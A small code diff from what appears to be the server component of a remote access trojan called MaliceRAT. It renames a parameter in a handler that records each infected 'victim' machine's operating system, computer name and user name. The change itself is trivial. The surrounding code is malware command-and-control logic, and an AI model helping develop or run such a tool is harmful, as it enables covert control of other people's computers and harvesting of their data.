@@ -12,13 +12,13 @@ namespace MaliceRAT.RatServer.Features
             server.MessageReceived += HandleMessage;
         }
 
-        private void HandleMessage(Victim victim, dynamic jsonMessage)
+        private void HandleMessage(Victim victim, dynamic message)
         {
-            if (jsonMessage["type"] == "system_info")
+            if (message["type"] == "system_info")
             {
-                victim.OS = jsonMessage["os"].ToString();
-                victim.PC = jsonMessage["pc"].ToString();
-                victim.User = jsonMessage["user"].ToString();
+                victim.OS = message["os"].ToString();
+                victim.PC = message["pc"].ToString();
+                victim.User = message["user"].ToString();
 
                 InfoReceived?.Invoke(victim);
             }
